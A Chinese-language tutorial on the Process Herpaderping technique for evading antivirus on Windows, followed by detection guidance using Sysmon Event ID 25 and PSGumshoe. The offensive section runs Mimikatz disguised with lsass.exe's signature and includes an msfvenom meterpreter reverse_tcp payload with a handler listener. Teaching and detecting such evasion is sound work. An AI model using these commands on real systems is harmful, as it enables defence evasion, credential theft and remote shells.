一、原理简介：

安全产品通过在Windows内核（PsSetCreateProcessNotifyRoutineEx）中注册回调来监挺进程创建操作。这个内核回调是在插入初始线程时调用的，而不是在创建进程对象时调用的。


业界公布了一种叫做过程Herpaderping的技术，这种技术可以用来躲避安全产品，包括Windows Defender。规避之所以有效，是因为在插入线程之前，在系统上创建进程对象的文件的内容会被修改。因此，当进程初始化时，安全产品不能确定是否应该允许执行或者将进程标记为恶意进程，因为启动进程的初始二进制文件与实际执行的进程不匹配。


有些产品使用写时扫描方法，其中包括对文件写入的监视。比如记录已写入的文件，推迟实际检查，直到IRP_MJ_CLEANUP 发生（例如，文件句柄关闭）。利用write->map->modify->execute->close的行为将破坏完全依赖IRP_MJ_CLEANUP检查的写入扫描。


三种技术类型手法的比较：

TypeTechnique
Hollowingmap -> modify section -> execute
Doppelgangingtransact -> write -> map -> rollback -> execute
Herpaderpingwrite -> map -> modify -> execute -> close



绕过流程如下：

1、将目标二进制文件写入磁盘，保持句柄打开

2、将文件映射为image section

3、使用节句柄创建进程对象

4、使用相同的目标文件句柄，隐藏磁盘上的文件

5、在进程中创建初始线程（此时，内核中的进程创建回调将启动。磁盘上的内容与image的内容不匹配。此时检查文件将导致错误的属性）

6、关闭句柄，触发IRP_MJ_CLEANUP，此时安全产品开始检查文件（因为我们已经隐藏了正在执行的内容，所以此时的检查将导致错误的属性）

Usage:

  SourceFile              Source file to execute.

  TargetFile              Target file to execute the source from.

  ReplacedWith    File to replace the target with. Optional, default overwrites the binary with a pattern.

  -h,--help                Prints tool usage.

  -d,--do-not-wait    Does not wait for spawned process to exit,  default waits.

  -l,--logging-mask number Specifies the logging mask, defaults to full  logging.

三个必须的参数：恶意文件名，重新写入的文件名，需要伪造的程序名


在这个例子中是 Mimikatz，一个将在磁盘上创建的目标文件的名称，以及一个可信二进制文件，它将作为目标二进制文件的替代文件，并将维护合法签名。

ProcessHerpaderping.exe mimikatz.exe pentestlab.exe lsass.exe

新进程(pentestlab.exe)将作为“ProcessHerpaderping.exe”的子进程运行。

所使用的lsass.exe可执行文件是Microsoft有符号的二进制文件，负责用户身份验证。查看签名列表，修改后的Mimikatz二进制文件将具有与lsass.exe相同的证书，并且看起来像是由 Microsoft签名的。


类似地，这种技术可以用于任意代码执行，metasploitframework 可以用于生成任意有效负载。

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f exe > pentestlaboratories.exe

接收连接，

use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp set LHOST 10.0.0.10 set LPORT 4444 exploit

三、检测

SysmonV13.01有能力检测这种技术，因为它可以检测何时进程图像是从不同的进程改变。具体来说，EventID25可以捕捉各种攻击性技术，这些技术试图篡改进程，如process hollowing and process herpaderping。Olafhartong发布了以下配置文件，可以在 Sysmon上启用ProcessTampering事件。

<Sysmon schemaversion="4.50">

  <EventFiltering>

    <RuleGroup name="" groupRelation="or">

      <ProcessTampering onmatch="exclude">

      </ProcessTampering>

    </RuleGroup>

  </EventFiltering>

</Sysmon>

可以通过执行以下命令使用上述配置文件安装 Sysmon:

Sysmon64.exe -i process-tampering.xml

执行Process Herpaderping技术将在Sysmon生成两个ID相同但消息类型不同的事件。

1.Image is replaced

2.Image is locked for access

Process Herpaderping – Execution


Event ID 25 – Process Tampering


第一个事件将包含它的映像被替换的合法进程。

Event ID 25 – Process Tampering


第二个事件将包含任意进程，该进程已经取代了合法进程并且已经在系统上执行。在事件日志中，消息类型将显示为“ Image is locked for access”。

Event ID 25 – Image Replaced

由Carlos Perez开发的PowerShell模块PSGumShoe可以用于从 Sysmon 检索与进程篡改相关的事件，因为它包含一个相关的 cmdlet。可以通过从PowerShell控制台执行以下命令来安装该模块。

Install-Module -Name PSGumshoe


执行下面的命令将从Sysmon获得发生过程篡改的图像。此外，第二个命令将识别的图像转换为Sysmon规则，可用于改进现有的检测规则。

Get-SysmonProcessTampering |select image -Unique

Get-SysmonProcessTampering |select image -Unique | ConvertTo-SysmonRule
